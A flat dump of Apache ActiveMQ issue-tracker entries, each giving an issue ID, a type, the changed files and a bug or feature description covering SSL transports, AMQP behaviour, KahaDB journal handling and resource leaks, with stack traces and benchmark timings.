The nio+ssl transports can hang on initial connection and never read from the socket after the SSL handshake for certain conditions.  This behavior is most evident when using the auto+nio+ssl transport for a network bridge between 2 brokers, however I also saw the issue for the normal nio+ssl transport when running the NetworkAsyncStartTest and even the amqp+nio+ssl transport.After debugging I found that the issue is that the onSelect method of the registered callback, which calls the serviceRead() method, is not always getting triggered.  I believe that the root of the problem is that even though a selector is registered with a SelectionKey.OP_READ, there is no guarantee that the selected set is correct which is what the SelectorWorker uses to detect if the operation is ready. The SelectionKey documentation specifically states that the ready set is a hint but not a guarantee that the channel is ready.  This seems to only effect the SSL transport (not normal NIO), probably because a read selection was already done once to unwrap the SSL transportMore info: https://docs.oracle.com/javase/8/docs/api/java/nio/channels/SelectionKey.htmlThe fix for this is to trigger the selectRead() after the transport finishes starting up.  (needs to be in a new thread specifically for OpenWire to allow the wireformat negotiation to not block on startup).  This will work for the SSL transport specifically since we know the transport is read to read from the the channel after starting up.  We know this because the SSL handshake already took place which means we"ve already read from the channel.
issueID:AMQ-6418
type:Bug
changed files:
texts:Peer certificates are not always set when using the auto transports with ssl
There are two problems with the auto ssl transport that is causing the peer certificates to not always be available and set on the ConnectionInfo object during connection.  First, for auto+nio+ssl, the auto init transport needs to have transport properties applied.  This is because the initialization transport does the SSL handshake so it needs to know whether or not transport.needClientAuth or transport.wantClientAuth is set.  Right now these properties are not processed so it never gets passed to the SSL socket which means none of the protocols have peer certs available over auto+nio+ssl.  Second, the Stomp transport is not properly setting the peer certs when using auto+ssl and not using NIO.
issueID:AMQ-6420
type:Bug
changed files:
texts:WireFormat options not applied for auto transports after first connection is created
When doing some more testing with the auto transports I noticed that the wireFormat options are applied for the first created connection but new connections after that do not have the options applied.  This appears to be because the options map is not copied so after setting the options on the first created connection the map is emptied so future connections don"t get the options applied.
issueID:AMQ-6422
type:Bug
changed files:
texts:AMQP - flow(1) without a dispositon can lead to blocked receive
Setting prefetch based on the credit can get in a knot if the credit is small and the dispositions are outstanding.The prefetch gets set to 1, but with an inflight message, there is nothing dispatched b/c the sub looks full.
issueID:AMQ-6423
type:Improvement
changed files:
texts:Durable sync over a network bridge should clean up non permissible subscriptions
AMQ-6373 adds a flag called syncDurableSubs which will add/remove network conduit bridge subscriptions when a bridge comes back online depending if they are needed or not still.  However, if there is a subscription that is part of a destination that is no longer permissible (ie not part of the statically or dynamically included lists) then it is not getting properly cleaned up.  These subscriptions should also be cleaned up when the bridge starts.
issueID:AMQ-6427
type:Task
changed files:
texts:AMQP: Update Qpid JMS to 0.11.0
None
issueID:AMQ-6428
type:Improvement
changed files:ActiveMQQueueReceiverResource.java
ActiveMQDynamicQueueSenderResource.java
AbstractActiveMQConsumerResource.java
ActiveMQDynamicTopicPublisherResource.java
ActiveMQTopicDurableSubscriberResource.java
ActiveMQTopicPublisherResource.java
AbstractActiveMQClientResource.java
ActiveMQTopicSubscriberResource.java
ActiveMQQueueSenderResource.java
AbstractActiveMQProducerResource.java
EmbeddedActiveMQBroker.java
texts:Add methods for sending messages to topics or queues
To simplify testing, the EmbeddedActiveMQBroker (in activemq-junit) should have methods to send messages to topics and queues.
issueID:AMQ-643
type:Bug
changed files:
texts:maxInactivityDuration does not seem to work properly
AMQ 4 03/17/2006 SNAPSHOTUsing maxInactivityDuration causes a connection to automatically break after the inactivity duration, even though nothing is wrong with either side of the connection.Tracing it through, it looks like the KeepAliveInfo command does not require a response.  This means that the KeepAlive sent never results in receive activity.  So, if both processes are perfectly fine, just not sending any data, the connection breaks due to InactivityMonitor.readCheck.I"ve changed KeepAliveInfo.java to return true for isResponseRequired.  This seems to fix the problem, from a client perspective, anyway.However, if this is used for broker-to-broker connections, and you force a problem with one of the brokers (like doing pstop on Solaris), major problems will happen:1)  The broker that is left alone seems to break the connection.  But, it continues to attempt to send messages to the failed broker.  It was mentioned in the forum at one point you were going to have the broker unregister subscriptions so it would not attempt to send messages to the failed broker.  Doesn"t seem like this is in place.2) If you reawaken the pstopped broker, the two brokers never really recover properly.  Connections continue to get broken, over and over again.
issueID:AMQ-6430
type:Bug
changed files:
texts:noLocal=true in durable subscriptions is ignored after reconnect
I create a connection to my local ActiveMQ and open two sessions. In the first session I create a durable topic subscriber with noLocal=true. In the second session I send a message to the same topic. Then I close both sessions and the connection. The first time I do this, everything works well, that means I send but do not receive the message. The second time I run the same application I send AND receive the message.After removing all files and directories in ActiveMQ"s data directory, not receiving my own message works again, but only once.
issueID:AMQ-6431
type:Bug
changed files:
texts:BitArrayBin doesn&#39;t work well with index larger than Integer.MAX_VALUE
I have a problem with "messageid deplicate". Then I found it"s a bug(AMQ-5016) in activemq5.9.0 , so I download the activemq5.14.0. I run the BitArrayBinTest.java: public static void main(String[] args) {       BitArrayBin toTest = new BitArrayBin(1024);       long largeNum = Integer.MAX_VALUE*2L +100L;       toTest.setBit(largeNum, true);       System.out.println(toTest.getBit(largeNum));   } I expect the results to be "true",but the result of running the above code is "false". I debug the code,and I  found a method "getBin(long index)" in class BitArrayBin. Code as follows:private int getBin(long index) {        int answer = 0;        if (longFirstIndex < 0) {            longFirstIndex = (int) (index - (index % BitArray.LONG_SIZE));        } else if (longFirstIndex >= 0) {            answer = (int)((index - longFirstIndex) / BitArray.LONG_SIZE);        }        return answer;    } I think the problem is in  code ‘longFirstIndex = (int) (index - (index % BitArray.LONG_SIZE))‘.  When  index is larger than Integer.MAX_VALUE, longFirstIndex will be negative.  I think this line of code should be modified to  ‘longFirstIndex = (long) (index - (index % BitArray.LONG_SIZE));’
issueID:AMQ-6432
type:Bug
changed files:MessageDatabase.java
texts:Improve &#39;Failed to load next journal location: null&#39; warning output
Seeing2016-09-19 15:11:30,270 | WARN  | ournal Checkpoint Worker | MessageDatabase                  |    emq.store.kahadb.MessageDatabase 2104 | 102 - org.apache.activemq.activemq-osgi - 5.14.0 |    Failed to load next journal location: nullit"d be great to improve the output in such a case (Journal Checkpoint Worker ).Why not show the exception stack (it seems weird to only show the stack when debug level is enabled).
issueID:AMQ-6433
type:Bug
changed files:TypeConversionSupport.java
texts:Missing check for null parameter in equals()
In equals() method in TypeConversionSupport class there is missing check for null parameter.According to javadoc of Object class: For any non-null reference value x, x.equals(null) should return false.
issueID:AMQ-6434
type:Bug
changed files:PooledTaskRunner.java
texts:Return inside finally
In runTask() method in PooledTaskRunner class there is an return statement in finally block. This will cause any exception that might be thrown in the try block to be discarded.
issueID:AMQ-6435
type:New Feature
changed files:pom.xml
BrokerView.java
BrokerViewMBean.java
IntrospectionSupport.java
ManagedRegionBroker.java
DestinationsViewFilter.java
texts:Implement JMX destination query API
In an environment when there thousands of destinations on the broker, current way of exposing all MBeans and looking into them in the tools does not scale. We need to implement an API that can be used by tools to filter, sort and page destinations in this scenario.
issueID:AMQ-6436
type:Bug
changed files:
texts:tmp_storage folder not cleaned on startup
saw this on our production servers, activemq failed to start due to no space on the mount where tmp_storage was located. Reproduced it on a local windows machine.start a default activemq broker at the command line.Run the attached code enough times to cause activemq to start writing to the the tmp_storage folder, in my case 10000 messages was enough to give me 513Mb in tmp_storagerestart activemq and note that the contents of the tmp_storage folder are still intact.
issueID:AMQ-6438
type:Bug
changed files:
texts:AMQP: Performance improvements and fixes in the Message transformers
The JMS Message Transformer seem to have several areas where performance can be improved.  Performance numbers on master before updates were made[jms] Total time for 1000000 cycles of transforms = 14209 ms  -> [testComplexQpidJMSMessage[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 4282 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 7363 ms  -> [testTypicalQpidJMSMessage[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 4475 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 2468 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 1613 ms  -> [testBodyOnlyMessage[Transformer->jms]][native] Total time for 1000000 cycles of transforms = 13861 ms  -> [testComplexQpidJMSMessage[Transformer->native]][native] Total time for 1000000 cycles of transforms = 5429 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->native]][native] Total time for 1000000 cycles of transforms = 8523 ms  -> [testTypicalQpidJMSMessage[Transformer->native]][native] Total time for 1000000 cycles of transforms = 4576 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->native]][native] Total time for 1000000 cycles of transforms = 2577 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->native]][native] Total time for 1000000 cycles of transforms = 646 ms  -> [testBodyOnlyMessage[Transformer->native]][raw] Total time for 1000000 cycles of transforms = 523 ms  -> [testComplexQpidJMSMessage[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 215 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 474 ms  -> [testTypicalQpidJMSMessage[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 468 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 274 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 436 ms  -> [testBodyOnlyMessage[Transformer->raw]]After updates and fixes.[jms] Total time for 1000000 cycles of transforms = 10593 ms  -> [testComplexQpidJMSMessage[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 3571 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 6172 ms  -> [testTypicalQpidJMSMessage[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 3725 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 2202 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->jms]][jms] Total time for 1000000 cycles of transforms = 837 ms  -> [testBodyOnlyMessage[Transformer->jms]][native] Total time for 1000000 cycles of transforms = 13193 ms  -> [testComplexQpidJMSMessage[Transformer->native]][native] Total time for 1000000 cycles of transforms = 5172 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->native]][native] Total time for 1000000 cycles of transforms = 7711 ms  -> [testTypicalQpidJMSMessage[Transformer->native]][native] Total time for 1000000 cycles of transforms = 4061 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->native]][native] Total time for 1000000 cycles of transforms = 2327 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->native]][native] Total time for 1000000 cycles of transforms = 371 ms  -> [testBodyOnlyMessage[Transformer->native]][raw] Total time for 1000000 cycles of transforms = 212 ms  -> [testComplexQpidJMSMessage[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 19 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 210 ms  -> [testTypicalQpidJMSMessage[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 205 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 231 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->raw]][raw] Total time for 1000000 cycles of transforms = 205 ms  -> [testBodyOnlyMessage[Transformer->raw]]
issueID:AMQ-644
type:New Feature
changed files:
texts:create Java Service Wrapper for ActiveMQ
http://wrapper.tanukisoftware.org/doc/english/introduction.html
issueID:AMQ-6441
type:Bug
changed files:
texts:Incorrect File System Size Reported with Amazon Elastic File System (EFS)
I"ve set up Active MQ in production with a shared file system master/slave configuration (KahaDB). I"ve set everything up and mounted the EFS on both EC2 instances. When I check the disk free stats I get 8 exabytes for the shared file system: $ df -h eu-west-1a.***.efs.eu-west-1.amazonaws.com:/  8.0E     0  8.0E   0% /mnt/efs Unfortunately, ActiveMQ cannot interpret this number (8 exabytes). This may be due to integer truncation.Here is a snippet of the log:Store limit is 102400 mb (current store usage is 0 mb). The data directory: /mnt/efs/kahadb only has -8796093022208 mb of usable space - resetting to maximum available disk space: -8796093022207 mb Store limit is -8796093022207 mb, whilst the max journal file size for the store is: 32 mb, the store will not accept any data when used.
issueID:AMQ-6442
type:Improvement
changed files:
texts:Config file org.apache.activemq.server-default.cfg points config to ${karaf.base}/etc
Config file org.apache.activemq.server-default.cfg (created after the first servicemix execution) points the parameter config to ${karaf.base}/etc/activemq.xml instead of ${karaf.etc}/activemq.xml.I cannot provide a patch because I didn"t find where this file is generated in the source repo, but it should be trivial.
issueID:AMQ-6444
type:Bug
changed files:
texts:AMQP: Messages in a Transaction which aren&#39;t settled should be remain acquired for the receiver after rollback
When a message is enlisted in a transaction by having an accepted disposition but is not settled, and the transaction is rolled back by the client, the broker should treat that message as still being acquired by the receiver and not redeliver it again and the receiver should be able to consume, modify, reject or release the delivery on its own afterwards.
issueID:AMQ-6445
type:Bug
changed files:Journal.java
DiskBenchmark.java
texts:RandomAccessFile is not closed properly
In DiskBenchmark class at 303 line and in Journal class at 290 line there is RandomAccessFile created. After that this methods are calledXXXXXXX.setLength(size);XXXXXXX.getChannel().force(true);XXXXXXX.getChannel().transferTo(0, size, raf.getChannel());. If one of them throw an Exception then the stream will not be closed.
issueID:AMQ-6446
type:Bug
changed files:
texts:New org.slf4j.Logger instance created for every new connection but never cleared when transport listener is configured for trace=true
Configuring the broker for transport trace:|<transportConnectorname="openwire"uri="tcp://0.0.0.0:61616?trace=true"/></transportConnectors>makes the broker create a new SLF4J Logger instance for every single connection.This Logger never get cleared not even when the connection is closed which can lead to OOM on load.trace=true is a great diagnostic tool but cannot be left enabled on a broker long term because of this.
issueID:AMQ-6449
type:Bug
changed files:
texts:Disable doclint for JDK 8 builds but not for JDK 7
I disabled doclint in 5.14.1 so that JDK 8 could be used to build as well as JDK 7.  However, turns out this flag needs to not be active for JDK 7 because it doesn"t exist. Also, there were a couple spots the javadoc plugin is defined that I missed.
issueID:AMQ-6450
type:Task
changed files:
texts:AMQP: Update Qpid JMS to 0.11.1
None
issueID:AMQ-6451
type:Bug
changed files:
texts:Preallocation strategy of zeros can leak file descriptors causing crash
If the preallocationStrategy is set to "zeros", ActiveMQ can intermittently become unable to allocate direct buffer memory with the default JVM settings. The exception isn"t handled, and ends up both creating an empty journal file and, more importantly, leaking a file descriptor.ActiveMQ eventually runs out of file descriptors and crashes.In addition to handling this condition, perhaps the default ACTIVEMQ_OPTS_MEMORY settings should configure enough direct memory to allow some multiple of log files to be created near simultaneously, or at least this possibility documented in the KahaDB settings.Relevant logs:2016-10-03 12:47:24,154 | WARN  | Async error occurred: java.lang.OutOfMemoryError: Direct buffer memory | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: ssl:///x.x.x.x:608052016-10-03 12:47:24,818 | WARN  | Async error occurred: java.lang.OutOfMemoryError: Direct buffer memory | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: ssl:///x.x.x.x:608112016-10-03 12:47:25,477 | WARN  | Async error occurred: java.lang.OutOfMemoryError: Direct buffer memory | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: ssl:///x.x.x.x:498302016-10-03 12:47:26,146 | WARN  | Store COMMIT FAILED:  | org.apache.activemq.transaction.LocalTransaction | ActiveMQ Transport: ssl:///x.x.x.x:65534java.lang.OutOfMemoryError: Direct buffer memory        at java.nio.Bits.reserveMemory(Bits.java:693)[:1.8.0_101]        at java.nio.DirectByteBuffer.<init>(DirectByteBuffer.java:123)[:1.8.0_101]        at java.nio.ByteBuffer.allocateDirect(ByteBuffer.java:311)[:1.8.0_101]        at sun.nio.ch.Util.getTemporaryDirectBuffer(Util.java:174)[:1.8.0_101]        at sun.nio.ch.IOUtil.write(IOUtil.java:58)[:1.8.0_101]        at sun.nio.ch.FileChannelImpl.write(FileChannelImpl.java:211)[:1.8.0_101]        at org.apache.activemq.store.kahadb.disk.journal.Journal.doPreallocationZeros(Journal.java:366)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.disk.journal.Journal.preallocateEntireJournalDataFile(Journal.java:333)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.disk.journal.Journal.newDataFile(Journal.java:631)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.disk.journal.Journal.rotateWriteFile(Journal.java:595)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.disk.journal.Journal.getCurrentDataFile(Journal.java:984)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender.enqueue(DataFileAppender.java:189)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender.storeItem(DataFileAppender.java:128)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.disk.journal.Journal.write(Journal.java:890)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:1108)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:1090)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:301)[activemq-kahadb-store-5.14.0.jar:5.14.0]        at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:70)[activemq-broker-5.14.0.jar:5.14.0]        at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:252)[activemq-broker-5.14.0.jar:5.14.0]        at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:113)[activemq-broker-5.14.0.jar:5.14.0]        at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:113)[activemq-broker-5.14.0.jar:5.14.0]        at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:118)[activemq-broker-5.14.0.jar:5.14.0]        at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:535)[activemq-broker-5.14.0.jar:5.14.0]        at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)[activemq-client-5.14.0.jar:5.14.0]        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:333)[activemq-broker-5.14.0.jar:5.14.0]        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:197)[activemq-broker-5.14.0.jar:5.14.0]        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)[activemq-client-5.14.0.jar:5.14.0]        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:125)[activemq-client-5.14.0.jar:5.14.0]        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:300)[activemq-client-5.14.0.jar:5.14.0]        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)[activemq-client-5.14.0.jar:5.14.0]        at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:108)[activemq-client-5.14.0.jar:5.14.0]        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)[activemq-client-5.14.0.jar:5.14.0]        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)[activemq-client-5.14.0.jar:5.14.0]        at java.lang.Thread.run(Thread.java:745)[:1.8.0_101]Empty journal files:-rw-r--r-- 1 activemq activemq         0 Oct  3 12:47 db-51425.log-rw-r--r-- 1 activemq activemq         0 Oct  3 12:47 db-51426.log-rw-r--r-- 1 activemq activemq         0 Oct  3 12:47 db-51427.log-rw-r--r-- 1 activemq activemq         0 Oct  3 12:47 db-51428.log-rw-r--r-- 1 activemq activemq         0 Oct  3 12:47 db-51429.loglsof output:java    29263 activemq  452u      REG             202,48         0       160 /activemq/kahadb/db-51425.logjava    29263 activemq  455u      REG             202,48         0       153 /activemq/kahadb/db-51426.logjava    29263 activemq  456u      REG             202,48         0       133 /activemq/kahadb/db-51427.logjava    29263 activemq  462u      REG             202,48         0       157 /activemq/kahadb/db-51428.log
issueID:AMQ-6452
type:Task
changed files:
texts:Geronimo transaction manager dependency version should be upgraded
Actually version of gtm is 2.2.1.<dependency>    <groupId>org.apache.geronimo.components</groupId>    <artifactId>geronimo-transaction</artifactId>    <version>2.2.1</version></dependency>Karaf for example does install gtm > 3.x.x since years and does therefor not support recovery together with activemq-jms-pool implementation. (NoClassDefFoundError!)
issueID:AMQ-6454
type:Bug
changed files:
texts:Message is redelivered after succesfull acknowledge()
JMS message is redelivered after successful call of acknowledge().The following methods are invoked:Thread1 : Message message = consumer.receive();Thread2 : consumer.close();Thread1: message.acknowledge();All the methods return successfully but the  message is redelivered on the next receive() call. Note that consumer.close() is typically used to force  consumer.receive() to return. According to JMS specification the scope of message acknowledge() call is session (not message consumer):https://docs.oracle.com/javaee/7/api/javax/jms/Message.html#acknowledge--A simple program to reproduce the bug is attached.Observed behavior: Message is redelivered.Program output:============Message sent. Id=ID:comp-63860-1475602285903-1:1:1:1:1Message received. Id=ID:comp-63860-1475602285903-1:1:1:1:1. Text=Welcome!Message succesfully acknowledgedMessage received. Id=ID:comp-63860-1475602285903-1:1:1:1:1. Text=Welcome!Message succesfully acknowledgedExpected behavior:Message should be delivered only once.
issueID:AMQ-6459
type:Bug
changed files:
texts:JMX broker view attribute tempPercentUsage does not decrease
Using  this JMX value for monitoring, an alarm can be set to some threshold.However when remedial action is taken to reduce usage, the value stays high.
issueID:AMQ-6460
type:Improvement
changed files:
texts:AMQP: Add better connection close handling to AMQP tests
Ensure that tests using the AMQP test client clean up opened connections if the test fails.
issueID:AMQ-6463
type:Bug
changed files:
texts:NPE on scheduler send via blocked waiting for space task
The response cannot be processed b/c there is no connection in the context provide by the scheduler plugin.The reply is lost so there is no message loss in this case, just a worrying stack trace.ERROR | Error in thread "ActiveMQ BrokerService[ILP-B] Task-18534"java.lang.NullPointerExceptionat org.apache.activemq.broker.region.Queue$4.run(Queue.java:688)[activemq-broker-5.14.0.jar:5.14.0]at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1551)[activemq-broker-5.14.0.jar:5.14.0]at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)[activemq-client-5.14.0.jar:5.14.0]at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)[activemq-client-5.14.0.jar:5.14.0]at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)[:1.7.0_51]at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)[:1.7.0_51]at java.lang.Thread.run(Thread.java:744)[:1.7.0_51]
issueID:AMQ-6464
type:Bug
changed files:
texts:AMQP: Incorrect handling of Rejected Outcome on Delivery
The Rejected outcome is meant to be a terminal outcome but we instead redeliver the message with an updated delivery counter instead of sending the message of to the DLQ to respect the expectation of the outcome that the message moves to the archived state.  Outcomes are documented here:http://docs.oasis-open.org/amqp/core/v1.0/os/amqp-core-messaging-v1.0-os.html#section-distribution-nodes
issueID:AMQ-6465
type:Bug
changed files:
texts:Memory usage incorrectly increases when messages are forwarded over a bridge for a durable subscription
There is an issue with duplicate message suppression for durable subscriptions over a network bridge that is causing the memory usage counter to grow and never shrink.  The issue is that when the message is checked against the network bridge filter, a reference to the message is incremented (which increases the memory usage counter) but then that reference is never decremented so the memory usage doesn"t decrease as it should.  The actual memory is freed but the counter continues to grow until it reaches the configured maximum at which point the broker can"t do any work because it thinks the memory is full.
issueID:AMQ-6466
type:Task
changed files:
texts:Update Qpid Proton to 0.15.0
None
issueID:AMQ-6467
type:Bug
changed files:
texts:AMQP: When creating a dynamic node the returned source / target is incomplete
When asked to create a sender / receiver that has a dynamic value in the source target we create a temporary destination in response, but we do not provide a source / target value that correctly describes the node we created.
issueID:AMQ-6468
type:Bug
changed files:
texts:Fix JSTL tags in the WebConsole
Some more places in the WebConsole do not use the correct JSTL tags to print out content and should be fixed.
issueID:AMQ-6470
type:Improvement
changed files:ActiveMQConnection.java
texts:Remove unused ControlCommand handling in client
We still have unnecessary handling for ControlCommand in ActiveMQClient
issueID:AMQ-6471
type:Bug
changed files:
texts:Runtime Configuration Plugin - groupClass on authorizationMap is lost on modification
in karaf - the activemq authorizationMap groupClass is specified to match the karaf login modules.the runtime configuration plugin supports updates to that map but does not set the groupClass in error. The result is that all of entries are invalid after a modification.A restart is required to rectify.
issueID:AMQ-6472
type:Improvement
changed files:
texts:Durable sync over a network bridge should sync forced durable subscriptions
The syncDurableSubs flag on a network bridge will cause durable subscriptions to be synced up on connection.  However this only applies to real durable subscriptions.  There"s another option on a network bridge added in AMQ-6383 that allows forcing subscriptions over a bridge to always been durable.  We should make sure that normal topic subscriptions are synced properly and that virtual consumer subscriptions are also synced properly if the the consumers are part of a destination that is configured to force durables.
issueID:AMQ-6474
type:Bug
changed files:AbstractInactivityMonitor.java
texts:Memory leak
Hello,when undeploying a Spring (4) webapp (JDK 1.8.101), we got a memory leak error message on a thread.AVERTISSEMENT: The web application &#91;venus&#93; appears to have started a thread named &#91;ActiveMQ InactivityMonitor Worker&#93; but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.misc.Unsafe.park(Native Method) java.util.concurrent.locks.LockSupport.parkNanos(Unknown Source) java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(Unknown Source) java.util.concurrent.SynchronousQueue$TransferStack.transfer(Unknown Source) java.util.concurrent.SynchronousQueue.poll(Unknown Source) java.util.concurrent.ThreadPoolExecutor.getTask(Unknown Source) java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) java.lang.Thread.run(Unknown Source)oct. 20, 2016 2:50:43 PM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreadswhen using an older version of active MQ 5.11.4 we don"t get the error.We notice the shutwon of factory thread pool is not made anymore ( inside class AbstractInactivityMonitor , method stopMonitorThreads this line has been removed: ThreadPoolUtils.shutdown(ASYNC_TASKS);Could you fix it.
issueID:AMQ-6476
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Enabling durable sync can deadlock a network bridge on start up
There is an issue with the processing of the new BrokerSubscriptionInfo command that is used for sync durables over a network bridge that can cause the brokers to get stuck starting up.  Depending on the timing of the BrokerSubscriptionInfo being sent, each broker can get stuck waiting to finish creating static destinations and not be able to finish because it"s waiting for the other broker to respond.  The root of the problem is the new countDown latch that was added when processing the new BrokerSubscriptionInfo object.  The fix for this to prevent a deadlock is to move that processing into a new thread so the transport doesn"t get blocked and can continue to process other commands.
issueID:AMQ-6477
type:Bug
changed files:
texts:ReduceMemoryFootprint should apply to non-persistent messages and subscriptions
There is a flag called reduceMemoryFootprint which will clear out the unmarshalled state of a message after it is added to a queue/topic because that state isn"t counted towards the size and can lead to OOM errors.However, even setting this flag, I am still seeing some brokers run out of memory.  After analyzing the heap dumps I have found 2 reasons for this:1) Non-persistent messages do not have their unmarshalled state cleared.  This was done because when a message is persisted it is guaranteed to have the marshalled state.  However we can still clear the memory for non-persistent messages as long as we check to make sure the marshalled state exists first, which it will for transports like TCP but won"t exist for the VM transport.2) When a message is added to a subscription the properties are needed to check which subscription messages can be dispatched to.  This causes the memory to be unmarshalled again.  In the topic case, we should probably defer the clearing of the state until after the message is added to a subscription because messages are immediately dispatched to topic subs so we don"t unnecessarily have to convert the data twice.  In the queue case it probably makes sense to clear memory on add to the queue and on add to the subscription.
issueID:AMQ-6478
type:Task
changed files:
texts:Update minimum Java version to 8
In order to upgrade to Camel 2.18 it"s time to update our required version of Java to 8 for the 5.15 release.
issueID:AMQ-6479
type:Improvement
changed files:
texts:AMQP: Add frame inspection capability to the test client.
None
issueID:AMQ-6482
type:Bug
changed files:WSTransportProxy.java
texts:Possible thread leak ?
We have an activemq broker running for ~ 24 hours, handling ~ 100k topics and up to 8k connections (for ~ 24k consumers).Looking at my graph, I see that I get a big increase of threads count happended (in 4 steps, ~ 500 more threads each time) as shown here : https://snapshot.raintank.io/dashboard/snapshot/ExUb4pgNYnmBo92JgbZrvJ6fiBm3PNrIHowever, even if the traffic dropped in the night, the thread count never decreased and is still ~ 2500.I checked a thread dump and it looks like (full dump attached) :``` grep  Thread.State thread_dump   |awk "{ print $2 }" |sort|uniq -c     26 RUNNABLE     70 TIMED_WAITING   2446 WAITING```Mhh, so many WAITING threads, let"s check why :``` grep   "parking to" thread_dump    |cut -d ">" -f 2 |sort |uniq -c      1  (a java.util.concurrent.CountDownLatch$Sync)   1308  (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)   1159  (a java.util.concurrent.locks.ReentrantLock$NonfairSync)     41  (a java.util.concurrent.SynchronousQueue$TransferStack)```I"m not a big java expert but seems a bit unexpected behavior to me.For various reason (big number of topics etc ) we use custom GC config, here it is :```ACTIVEMQ_OPTS_MEMORY="-Xms128M -Xmx10G -Xloggc:/home/log/activemq/gc.log -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+UseG1GC -XX:InitiatingHeapOccupancyPercent=75 -XX:NewRatio=4"```Maxence
issueID:AMQ-6483
type:Bug
changed files:KahaDBStore.java
texts:KahaDBStore getMessageSize mistakenly uses int cast on value that should be long
Casting and argument typing on the execution in KahaDBStore getMessageSize results in casting a long down to int only to cast back up to long again.
issueID:AMQ-6484
type:Bug
changed files:AmqpFrameValidator.java
AmqpValidator.java
texts:AMQP test client validator classes not thread safe
The logic in the validators needs to be made thread safe
issueID:AMQ-6485
type:Bug
changed files:
texts:AMQP: Add ability to inspect deliveries and delivery updates to the test client.
